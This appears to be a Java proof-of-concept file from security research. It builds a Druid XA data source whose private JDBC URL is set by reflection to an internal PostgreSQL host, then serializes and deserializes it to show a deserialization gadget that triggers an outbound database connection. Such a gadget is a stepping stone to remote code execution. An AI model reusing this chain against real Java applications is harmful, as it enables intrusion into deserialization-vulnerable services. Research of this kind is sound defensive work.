package ses.poc.druid;

import com.alibaba.druid.pool.DruidAbstractDataSource;
import com.alibaba.druid.pool.xa.DruidXADataSource;
import ses.poc.Caller;
import ses.poc.SerializationUtils;

import java.io.IOException;
import java.lang.reflect.Field;
import java.sql.SQLException;

public class Main {

    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, SQLException {

        DruidXADataSource dataSource = new DruidXADataSource();

        Field jdbcURLField = DruidAbstractDataSource.class.getDeclaredField("jdbcUrl");
        jdbcURLField.setAccessible(true);
        jdbcURLField.set(dataSource, "jdbc:postgresql://ses-internal.cs.umu.se:7777/");
        Field initedField = DruidAbstractDataSource.class.getDeclaredField("inited");
        initedField.setAccessible(true);
        //initedField.set(dataSource, true);
        Field printWriterField = DruidAbstractDataSource.class.getDeclaredField("logWriter");
        printWriterField.setAccessible(true);
        printWriterField.set(dataSource, null);
        Field statLoggerField = DruidAbstractDataSource.class.getDeclaredField("statLogger");
        statLoggerField.setAccessible(true);
        statLoggerField.set(dataSource, null);
        Field transactionHistogramField = DruidAbstractDataSource.class.getDeclaredField("transactionHistogram");
        transactionHistogramField.setAccessible(true);
        transactionHistogramField.set(dataSource, null);

        Caller caller = new Caller();
        caller.dataSource = dataSource;

        //dataSource.getXAConnection();

        SerializationUtils.serializeDeserialize(caller);





    }




}
